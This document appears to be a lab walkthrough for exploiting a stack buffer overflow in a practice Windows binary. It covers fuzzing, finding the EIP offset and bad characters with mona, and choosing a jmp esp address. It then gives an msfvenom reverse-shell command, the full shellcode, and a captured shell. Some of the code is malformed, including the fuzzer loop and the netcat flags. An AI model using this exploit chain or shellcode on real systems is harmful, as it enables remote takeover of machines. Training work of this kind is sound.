# Buffer Overflows

Immunity Debugger
=================

    - We Fuzz the executable.
    - We crash the app and get control of the EIP.
    - We locate the bad characters
    - We find and select a Jump Point
    - We then generate our payload code
    - We make sure to add our NOP sleds.
    - We exploit.

    Open with - xfreerdp /u:admin /p:password /cert:ignore /v:10.10.70.232 /workarea 

Right-click the Immunity Debugger icon on the Desktop and choose "Run as administrator".

When Immunity loads, click the open file icon, or choose File -> Open. Navigate to the vulnerable-apps folder on the admin user's desktop, and then the "oscp" folder. Select the "oscp" (oscp.exe) binary and click "Open". 

On your Kali box, connect to port 1337 on 10.10.149.5 using netcat: 

    nc 10.10.149.5 1337 

    Type "HELP" and press Enter. Note that there are 10 different OVERFLOW commands numbered 1 - 10. Type "OVERFLOW1 test" and press enter. The response should be "OVERFLOW1 COMPLETE". Terminate the connection.


Mona Config
===========

The mona script has been preinstalled, however to make it easier to work with, you should configure a working folder using the following command, which you can run in the command input box at the bottom of the Immunity Debugger window:

    !mona config -set workingfolder c:\mona\%p

The latest version can be downloaded here: https://github.com/corelan/mona

Fuzzing
=======

The following Python script can be modified and used to fuzz remote entry points to an application. It will send increasingly long buffer strings in the hope that one eventually crashes the application.

    #!/usr/bin/env python3

    import socket, time, sys

    ip = "10.10.70.232"

    port = 1337
    timeout = 5
    prefix = "OVERFLOW1 "

    string = prefix + "A" * 100

    for string in buffer: 
    while True:
    try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  
    except:
        print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
        sys.exit(0)
    string += 100 * "A"
    time.sleep(1)

The fuzzer will send increasingly long strings comprised of As. If the fuzzer crashes the server with one of the strings, the fuzzer should exit with an error message. Make a note of the largest number of bytes that were sent.

    Run the fuzzer.py script using python: python3 fuzzer.py

Crash Replication & Controlling EIP
===================================

The following skeleton exploit code can be used for the rest of the buffer overflow exploit:

Create another file on your Kali box called exploit.py with the following contents:

    import socket
    
    ip = "10.10.70.232"
    port = 1337
    
    prefix = "OVERFLOW1 "
    offset = 0
    overflow = "A" * offset
    retn = ""
    padding = ""
    payload = ""
    postfix = ""
    
    buffer = prefix + overflow + retn + padding + payload + postfix
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        s.connect((ip, port))
        print("Sending evil buffer...")
        s.send(buffer + "\r\n")
        print("Done!")
    except:
        print("Could not connect.")

Using the buffer length which caused the crash, generate a unique buffer so we can determine the offset in the pattern which overwrites the EIP register, and the offset in the pattern to which other registers point. Create a pattern that is 400 bytes larger than the crash buffer, so that we can determine whether our shellcode can fit immediately. If the larger buffer doesn't crash the application, use a pattern equal to the crash buffer length and slowly add more to the buffer to find space.

Fuzzing crashed at 2000 bytes

    $ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2400 (400 more than crash)

    Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9

On Windows, in Immunity Debugger, re-open the oscp.exe again using the same method as before, and click the red play icon to get it running. You will have to do this prior to each time we run the exploit.py (which we will run multiple times with incremental modifications).

While the unique buffer is on the stack, use mona's findmsp command, with the distance argument set to the pattern length.

    !mona findmsp -distance 600
    ...
    [+] Looking for cyclic pattern in memory
    Cyclic pattern (normal) found at 0x005f3614 (length 600 bytes)
    Cyclic pattern (normal) found at 0x005f4a40 (length 600 bytes)
    Cyclic pattern (normal) found at 0x017df764 (length 600 bytes)
    EIP contains normal pattern : 0x78413778 (offset 1978)

In this output you should see a line which states:

EIP contains normal pattern : ... (offset XXXX)

Create a new buffer using this information to ensure that we can control EIP:

Update your exploit.py script and set the offset variable to this value (was previously set to 0). Set the payload variable to an empty string again. Set the retn variable to "BBBB".

    prefix = ""
    offset = 1978
    overflow = "A" * offset
    retn = "BBBB"
    padding = ""
    payload = ""
    postfix = ""
    
    buffer = prefix + overflow + retn + padding + payload + postfix

Crash the application using this buffer, and make sure that EIP is overwritten by B's (\\x42)e.g. 42424242.

Finding Bad Characters
======================

Generate a bytearray using mona, and exclude the null byte (\\x00) by default. Note the location of the bytearray.bin file that is generated.

    !mona bytearray -b "\x00"

Now generate a string of bad chars that is identical to the bytearray. The following python script can be used to generate a string of bad chars from \\x01 to \\xff:

from __future__ import print_function

for x in range(1, 256):
    print("\\x" + "{:02x}".format(x), end='')

print()

Crash the application using this buffer, and make a note of the address to which ESP points. This can change every time you crash the application, so get into the habit of copying it from the register each time.

Use the mona compare command to reference the bytearray you generated, and the address to which ESP points:

    !mona compare -f C:\mona\oscp\bytearray.bin -a <address>

We take note of the badchars returned:

00 07 08 2e 2f a0 a1

The first badchar in the list should be the null byte (\x00) since we already removed it from the file. Make a note of any others. Generate a new bytearray in mona, specifying these new badchars along with \x00. Then update the payload variable in your exploit.py script and remove the new badchars as well.

Our new Mona byarray command will look like this:

!mona bytearray -b "\x00\x07\x08\xa0\xa1\x2e\x2f"

We repeat the badchar comparison until the results status returns “Unmodified”. This indicates that no more badchars exist. This means executing the expliot, running the Mona-look-for-bad-chars-command, if there are new badchars we run mona-generate-new-bytearray-excluding-new-badchards-command, update the exploit

Find a Jump Point
=================

The mona jmp command can be used to search for jmp (or equivalent) instructions to a specific register. The jmp command will, by default, ignore any modules that are marked as aslr or rebase.

The following example searches for "jmp esp" or equivalent (e.g. call esp, push esp; retn, etc.) while ensuring that the address of the instruction doesn't contain the bad chars \\x00, \\x0a, and \\x0d.

    !mona jmp -r esp -cpb "\x00\x07\x08\xa0\xa1\x2e\x2f"

The mona find command can similarly be used to find specific instructions, though for the most part, the jmp command is sufficient:

    !mona find -s 'jmp esp' -type instr -cm aslr=false,rebase=false,nx=false -cpb "\x00\x0a\x0d"

Choose an address and update your exploit.py script, setting the “retn” variable to the address, written backwards (since the system is little endian). For example if the address is \x01\x02\x03\x04 in Immunity, write it as \x04\x03\x02\x01 in your exploit.

Our address is 625011AF so our retn = "\xaf\x11\x50\x62"

Generate Payload
================

Generate a reverse shell payload using msfvenom, making sure to exclude the same bad chars that were found previously:

    msfvenom -p windows/shell_reverse_tcp LHOST=10.18.91.23 LPORT=4444 EXITFUNC=thread -b "\x00\x07\x08\xa0\xa1\x2e\x2f" -f py

    buf =  ""
    buf += "\xd9\xca\xd9\x74\x24\xf4\xba\xcb\x32\xd3\xa2\x58"
    buf += "\x31\xc9\xb1\x52\x31\x50\x17\x03\x50\x17\x83\x23"
    buf += "\xce\x31\x57\x4f\xc7\x34\x98\xaf\x18\x59\x10\x4a"
    buf += "\x29\x59\x46\x1f\x1a\x69\x0c\x4d\x97\x02\x40\x65"
    buf += "\x2c\x66\x4d\x8a\x85\xcd\xab\xa5\x16\x7d\x8f\xa4"
    buf += "\x94\x7c\xdc\x06\xa4\x4e\x11\x47\xe1\xb3\xd8\x15"
    buf += "\xba\xb8\x4f\x89\xcf\xf5\x53\x22\x83\x18\xd4\xd7"
    buf += "\x54\x1a\xf5\x46\xee\x45\xd5\x69\x23\xfe\x5c\x71"
    buf += "\x20\x3b\x16\x0a\x92\xb7\xa9\xda\xea\x38\x05\x23"
    buf += "\xc3\xca\x57\x64\xe4\x34\x22\x9c\x16\xc8\x35\x5b"
    buf += "\x64\x16\xb3\x7f\xce\xdd\x63\x5b\xee\x32\xf5\x28"
    buf += "\xfc\xff\x71\x76\xe1\xfe\x56\x0d\x1d\x8a\x58\xc1"
    buf += "\x97\xc8\x7e\xc5\xfc\x8b\x1f\x5c\x59\x7d\x1f\xbe"
    buf += "\x02\x22\x85\xb5\xaf\x37\xb4\x94\xa7\xf4\xf5\x26"
    buf += "\x38\x93\x8e\x55\x0a\x3c\x25\xf1\x26\xb5\xe3\x06"
    buf += "\x48\xec\x54\x98\xb7\x0f\xa5\xb1\x73\x5b\xf5\xa9"
    buf += "\x52\xe4\x9e\x29\x5a\x31\x30\x79\xf4\xea\xf1\x29"
    buf += "\xb4\x5a\x9a\x23\x3b\x84\xba\x4c\x91\xad\x51\xb7"
    buf += "\x72\xd8\xb7\xec\x95\xb4\xb5\x12\x8b\x18\x33\xf4"
    buf += "\xc1\xb0\x15\xaf\x7d\x28\x3c\x3b\x1f\xb5\xea\x46"
    buf += "\x1f\x3d\x19\xb7\xee\xb6\x54\xab\x87\x36\x23\x91"
    buf += "\x0e\x48\x99\xbd\xcd\xdb\x46\x3d\x9b\xc7\xd0\x6a"
    buf += "\xcc\x36\x29\xfe\xe0\x61\x83\x1c\xf9\xf4\xec\xa4"
    buf += "\x26\xc5\xf3\x25\xaa\x71\xd0\x35\x72\x79\x5c\x61"
    buf += "\x2a\x2c\x0a\xdf\x8c\x86\xfc\x89\x46\x74\x57\x5d"
    buf += "\x1e\xb6\x68\x1b\x1f\x93\x1e\xc3\xae\x4a\x67\xfc"
    buf += "\x1f\x1b\x6f\x85\x7d\xbb\x90\x5c\xc6\xdb\x72\x74"
    buf += "\x33\x74\x2b\x1d\xfe\x19\xcc\xc8\x3d\x24\x4f\xf8"
    buf += "\xbd\xd3\x4f\x89\xb8\x98\xd7\x62\xb1\xb1\xbd\x84"
    buf += "\x66\xb1\x97"
    payload =buf

Prepend NOPs
============

If an encoder was used (more than likely if bad chars are present, remember to prepend at least 16 NOPs (\\x90) to the payload.

    padding = "\x90" * 16

Final Buffer (Exploit)
============

With the correct prefix, offset, return address, padding, and payload set, you can now exploit the buffer overflow to get a reverse shell. Start a netcat listener on your Kali box using the LPORT you specified in the msfvenom command (4444 if you didn’t change it).

    nc - lvnp 4444
    listening on [any] 4444 ...

Restart oscp.exe in Immunity and run the modified exploit.py script again. Your netcat listener should catch a reverse shell!

    connect to [10.18.91.23] from (UNKNOWN) [10.10.149.5] 49271
    Microsoft Windows [Version 6.1.7601]
    Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

    C:\Users\admin\Desktop\vulnerable-apps\oscp>
